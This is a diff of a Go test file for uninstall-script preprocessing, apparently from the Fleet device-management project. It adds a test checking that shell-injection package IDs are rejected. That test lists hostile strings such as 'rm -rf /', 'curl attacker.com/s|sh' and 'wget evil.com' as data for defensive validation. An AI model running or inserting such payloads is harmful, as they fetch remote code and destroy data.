@@ -49,12 +49,12 @@ ${PACKAGE_ID}`
 	require.NoError(t, preProcessUninstallScript(&payload))
 	expected := `
 blah$PACKAGE_IDS
-pkgids="com.foo"
-they are "com.foo", right $MY_SECRET?
-quotes for "com.foo"
-blah"com.foo"withConcat
-quotes and braces for "com.foo"
-"com.foo"`
+pkgids='com.foo'
+they are 'com.foo', right $MY_SECRET?
+quotes for 'com.foo'
+blah'com.foo'withConcat
+quotes and braces for 'com.foo'
+'com.foo'`
 	assert.Equal(t, expected, payload.UninstallScript)
 
 	payload = fleet.UploadSoftwareInstallerPayload{
@@ -66,28 +66,28 @@ quotes and braces for "com.foo"
 	expected = `
 blah$PACKAGE_IDS
 pkgids=(
-  "com.foo"
-  "com.bar"
+  'com.foo'
+  'com.bar'
 )
 they are (
-  "com.foo"
-  "com.bar"
+  'com.foo'
+  'com.bar'
 ), right $MY_SECRET?
 quotes for (
-  "com.foo"
-  "com.bar"
+  'com.foo'
+  'com.bar'
 )
 blah(
-  "com.foo"
-  "com.bar"
+  'com.foo'
+  'com.bar'
 )withConcat
 quotes and braces for (
-  "com.foo"
-  "com.bar"
+  'com.foo'
+  'com.bar'
 )
 (
-  "com.foo"
-  "com.bar"
+  'com.foo'
+  'com.bar'
 )`
 	assert.Equal(t, expected, payload.UninstallScript)
 
@@ -96,7 +96,137 @@ quotes and braces for (
 
 	payload.UpgradeCode = "foo"
 	require.NoError(t, preProcessUninstallScript(&payload))
-	assert.Equal(t, `"foo"`, payload.UninstallScript)
+	assert.Equal(t, `'foo'`, payload.UninstallScript)
+}
+
+func TestPreProcessUninstallScriptMaliciousInput(t *testing.T) {
+	t.Parallel()
+
+	maliciousIDs := []struct {
+		name string
+		id   string
+	}{
+		{"command substitution", "com.app$(id)"},
+		{"backtick execution", "app`id`"},
+		{"pipe injection", "app|rm -rf /"},
+		{"semicolon injection", "app;curl attacker.com"},
+		{"ampersand injection", "app&wget evil.com"},
+		{"redirect injection", "app>file"},
+		{"subshell injection", "com.app$(curl attacker.com/s|sh)"},
+		{"single quote escape attempt", "app'$(id)'"},
+		{"double quote injection", `app"$(id)"`},
+		{"backslash injection", `app\nid`},
+		{"newline injection", "app\nid"},
+	}
+
+	for _, tc := range maliciousIDs {
+		t.Run(tc.name, func(t *testing.T) {
+			payload := fleet.UploadSoftwareInstallerPayload{
+				Extension:       "deb",
+				UninstallScript: "$PACKAGE_ID",
+				PackageIDs:      []string{tc.id},
+			}
+			require.Error(t, preProcessUninstallScript(&payload), "expected error for malicious input: %s", tc.id)
+		})
+	}
+
+	// Verify valid identifiers still pass
+	validIDs := []string{
+		"com.example.app",
+		"ruby",
+		"org.mozilla.firefox",
+		"{12345-ABCDE-67890}",
+		"Microsoft.VisualStudioCode",
+		"package/name",
+		"my-app_v2.0+build1",
+	}
+	for _, id := range validIDs {
+		payload := fleet.UploadSoftwareInstallerPayload{
+			Extension:       "deb",
+			UninstallScript: "$PACKAGE_ID",
+			PackageIDs:      []string{id},
+		}
+		require.NoError(t, preProcessUninstallScript(&payload), "expected no error for valid input: %s", id)
+	}
+}
+
+func TestPreProcessUninstallScriptSkipsValidationWhenNoTemplateVars(t *testing.T) {
+	t.Parallel()
+
+	// Non-ASCII package ID that would fail the safeIdentifierRegex validation
+	nonASCIIID := "CrossCore\u00ae Embedded Studio v3.0.2"
+
+	t.Run("non-ASCII ID succeeds when script has no template vars", func(t *testing.T) {
+		payload := fleet.UploadSoftwareInstallerPayload{
+			Extension:       "exe",
+			UninstallScript: `$softwareName = "CrossCore Embedded Studio"`,
+			PackageIDs:      []string{nonASCIIID},
+		}
+		require.NoError(t, preProcessUninstallScript(&payload))
+		assert.Equal(t, `$softwareName = "CrossCore Embedded Studio"`, payload.UninstallScript)
+	})
+
+	t.Run("non-ASCII ID succeeds when script uses PACKAGE_ID", func(t *testing.T) {
+		payload := fleet.UploadSoftwareInstallerPayload{
+			Extension:       "exe",
+			UninstallScript: "$PACKAGE_ID",
+			PackageIDs:      []string{nonASCIIID},
+		}
+		require.NoError(t, preProcessUninstallScript(&payload))
+		assert.Contains(t, payload.UninstallScript, "'"+nonASCIIID+"'")
+	})
+
+	t.Run("non-ASCII upgrade code succeeds when script has no UPGRADE_CODE", func(t *testing.T) {
+		payload := fleet.UploadSoftwareInstallerPayload{
+			Extension:       "msi",
+			UninstallScript: "msiexec /x $PACKAGE_ID /quiet",
+			PackageIDs:      []string{"valid-id"},
+			UpgradeCode:     "code\u00ae",
+		}
+		require.NoError(t, preProcessUninstallScript(&payload))
+		assert.Contains(t, payload.UninstallScript, "'valid-id'")
+	})
+
+	t.Run("non-ASCII upgrade code succeeds when script uses UPGRADE_CODE", func(t *testing.T) {
+		payload := fleet.UploadSoftwareInstallerPayload{
+			Extension:       "msi",
+			UninstallScript: "msiexec /x $UPGRADE_CODE /quiet",
+			PackageIDs:      []string{"valid-id"},
+			UpgradeCode:     "code\u00ae",
+		}
+		require.NoError(t, preProcessUninstallScript(&payload))
+		assert.Contains(t, payload.UninstallScript, "'code\u00ae'")
+	})
+
+	t.Run("dmg skips validation entirely", func(t *testing.T) {
+		payload := fleet.UploadSoftwareInstallerPayload{
+			Extension:       "dmg",
+			UninstallScript: "$PACKAGE_ID\n\necho 'foo'",
+			PackageIDs:      []string{nonASCIIID},
+		}
+		require.NoError(t, preProcessUninstallScript(&payload))
+		require.Equal(t, "$PACKAGE_ID\n\necho 'foo'", payload.UninstallScript) // confirm no variable substitution
+	})
+
+	t.Run("zip skips validation entirely", func(t *testing.T) {
+		payload := fleet.UploadSoftwareInstallerPayload{
+			Extension:       "zip",
+			UninstallScript: "$PACKAGE_ID\n\necho 'foo'",
+			PackageIDs:      []string{nonASCIIID},
+		}
+		require.NoError(t, preProcessUninstallScript(&payload))
+		require.Equal(t, "$PACKAGE_ID\n\necho 'foo'", payload.UninstallScript) // confirm no variable substitution
+	})
+
+	t.Run("empty PackageIDs skips processing", func(t *testing.T) {
+		payload := fleet.UploadSoftwareInstallerPayload{
+			Extension:       "exe",
+			UninstallScript: "$PACKAGE_ID",
+			PackageIDs:      []string{},
+		}
+		require.NoError(t, preProcessUninstallScript(&payload))
+		require.Equal(t, "$PACKAGE_ID", payload.UninstallScript) // confirm no variable substitution
+	})
 }
 
 func TestInstallUninstallAuth(t *testing.T) {
@@ -127,6 +257,9 @@ func TestInstallUninstallAuth(t *testing.T) {
 	}
 	ds.GetHostLastInstallDataFunc = func(ctx context.Context, hostID uint, installerID uint) (*fleet.HostLastInstallData, error) {
 		return nil, nil
+	}
+	ds.ResetNonPolicyInstallAttemptsFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint) error {
+		return nil
 	}
 	ds.InsertSoftwareInstallRequestFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint, opts fleet.HostSoftwareInstallOptions) (string,
 		error,
@@ -364,7 +497,7 @@ func TestGetInHouseAppManifest(t *testing.T) {
 			}, nil
 		}
 
-		return nil, notFoundError{}
+		return nil, &notFoundError{}
 	}
 
 	expected := `
@@ -432,7 +565,6 @@ func TestGetInHouseAppManifest(t *testing.T) {
 	manifest, err = svc.GetInHouseAppManifest(ctx, 1, nil)
 	require.NoError(t, err)
 	require.Contains(t, string(manifest), signerURL)
-
 }
 
 func checkAuthErr(t *testing.T, shouldFail bool, err error) {
@@ -667,6 +799,11 @@ func TestInstallShScriptOnDarwin(t *testing.T) {
 		return nil, nil
 	}
 
+	// Reset retry attempts (no-op for test)
+	ds.ResetNonPolicyInstallAttemptsFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint) error {
+		return nil
+	}
+
 	// Capture that install request was inserted
 	ds.InsertSoftwareInstallRequestFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint, opts fleet.HostSoftwareInstallOptions) (string, error) {
 		return "install-uuid", nil
@@ -740,4 +877,23 @@ func TestInstallShScriptOnWindowsFails(t *testing.T) {
 	require.ErrorAs(t, err, &bre, "error should be BadRequestError")
 	require.NotNil(t, bre)
 	require.Contains(t, bre.Message, "can be installed only on linux hosts")
+}
+
+func TestSelfServiceInstallSoftwareTitleFailsOnPersonallyEnrolledDevices(t *testing.T) {
+	t.Parallel()
+	ds := new(mock.Store)
+	svc := newTestService(t, ds)
+
+	for _, platform := range []string{"ios", "ipados"} {
+		fakeHost := &fleet.Host{
+			Platform: platform,
+			MDM: fleet.MDMHostData{
+				EnrollmentStatus: ptr.String(string(fleet.MDMEnrollStatusPersonal)),
+			},
+		}
+
+		err := svc.SelfServiceInstallSoftwareTitle(t.Context(), fakeHost, 1)
+		require.Error(t, err, "expected error when installing on personally enrolled device for platform %s", platform)
+		require.ErrorContains(t, err, "Couldn't install. Currently, software install isn't supported on personal (BYOD) iOS and iPadOS hosts.", "error message should indicate personally enrolled devices aren't supported for platform %s", platform)
+	}
 }
